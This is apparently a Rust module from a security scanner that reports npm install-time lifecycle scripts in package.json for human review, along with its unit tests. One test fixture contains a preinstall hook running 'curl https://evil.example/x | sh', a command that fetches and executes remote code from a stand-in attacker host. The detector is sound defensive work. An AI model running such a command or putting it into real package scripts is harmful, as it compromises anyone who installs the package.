//! npm install-time scripts.
//!
//! `preinstall`, `install`, `postinstall` and `prepare` run automatically
//! when a package is installed, with the installing user's privileges. They
//! are the usual delivery path for npm malware, so every one present in a
//! `package.json` is surfaced as a finding for a human to review — even
//! when the command itself looks harmless.
//!
//! Detection is purely declarative: this module parses `package.json` and
//! reads the `scripts` object. It never runs a script or invokes a shell.

use serde_json::Value;

use crate::cve::severity::Severity;

use super::BehavioralFinding;

/// Lifecycle hooks that run during install or when a git dependency is
/// prepared, in the order npm runs them.
pub const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall", "prepare"];

/// Severity for a declared install script. An install script is not proof of
/// malice — many legitimate packages compile native code — but it is the
/// highest-risk surface in an npm package, so it warrants review.
pub const SEVERITY: Severity = Severity::Medium;

/// One install-time hook declared by a package.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InstallScript {
    /// Hook name, one of [`INSTALL_HOOKS`].
    pub hook: String,
    /// Command line exactly as declared.
    pub command: String,
}

impl InstallScript {
    /// This script as a [`BehavioralFinding`] labelled with the supplied
    /// package-relative file (normally `package.json`).
    pub fn finding_in(&self, file: &str) -> BehavioralFinding {
        BehavioralFinding {
            file: file.to_string(),
            line: None,
            severity: SEVERITY,
            message: format!("install script `{}`: {}", self.hook, self.command),
        }
    }

    /// This script as a finding on `package.json`.
    pub fn finding(&self) -> BehavioralFinding {
        self.finding_in("package.json")
    }
}

/// Returns every install-time script in `package_json`, as
/// `(hook, command)` pairs in [`INSTALL_HOOKS`] order.
///
/// Invalid JSON, a missing `scripts` object, and non-string values are
/// ignored — this is a best-effort detector, not a package.json validator.
pub fn install_scripts(package_json: &str) -> Vec<(String, String)> {
    let Ok(document) = serde_json::from_str::<Value>(package_json) else {
        return Vec::new();
    };
    let Some(scripts) = document.get("scripts").and_then(Value::as_object) else {
        return Vec::new();
    };
    INSTALL_HOOKS
        .iter()
        .filter_map(|hook| {
            let command = scripts.get(*hook)?.as_str()?;
            Some(((*hook).to_string(), command.to_string()))
        })
        .collect()
}

/// [`install_scripts`] with the hook and command separated.
pub fn install_script_entries(package_json: &str) -> Vec<InstallScript> {
    install_scripts(package_json)
        .into_iter()
        .map(|(hook, command)| InstallScript { hook, command })
        .collect()
}

/// Wraps every install script in `package_json` as a finding on
/// `package.json`.
pub fn install_script_findings(package_json: &str) -> Vec<BehavioralFinding> {
    install_script_entries(package_json)
        .iter()
        .map(InstallScript::finding)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn no_scripts_yields_nothing() {
        assert_eq!(
            install_scripts(r#"{"name":"clean","version":"1.0.0"}"#),
            Vec::new()
        );
        assert_eq!(install_scripts(r#"{"name":"clean"}"#), Vec::new());
        assert_eq!(install_scripts(r#"{"scripts":{}}"#), Vec::new());
        assert_eq!(install_scripts("not json"), Vec::new());
    }

    #[test]
    fn one_script_is_returned() {
        let json = r#"{"scripts":{"postinstall":"node build.js"}}"#;
        assert_eq!(
            install_scripts(json),
            vec![("postinstall".to_string(), "node build.js".to_string())]
        );
    }

    #[test]
    fn all_four_hooks_are_returned_in_order() {
        let json = r#"{
            "scripts": {
                "prepare": "husky install",
                "postinstall": "node post.js",
                "test": "jest",
                "install": "node-gyp rebuild",
                "preinstall": "node pre.js"
            }
        }"#;
        assert_eq!(
            install_scripts(json),
            vec![
                ("preinstall".to_string(), "node pre.js".to_string()),
                ("install".to_string(), "node-gyp rebuild".to_string()),
                ("postinstall".to_string(), "node post.js".to_string()),
                ("prepare".to_string(), "husky install".to_string()),
            ]
        );
    }

    #[test]
    fn unrelated_scripts_and_non_strings_are_ignored() {
        let json = r#"{
            "scripts": {
                "test": "cargo test",
                "build": "tsc",
                "postinstall": 42,
                "preinstall": null
            }
        }"#;
        assert_eq!(install_scripts(json), Vec::new());
    }

    #[test]
    fn findings_carry_the_hook_and_truncate_nothing() {
        let json = r#"{"scripts":{"preinstall":"curl https://evil.example/x | sh"}}"#;
        let findings = install_script_findings(json);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].file, "package.json");
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0].message.contains("preinstall"));
        assert!(findings[0]
            .message
            .contains("curl https://evil.example/x | sh"));
    }
}
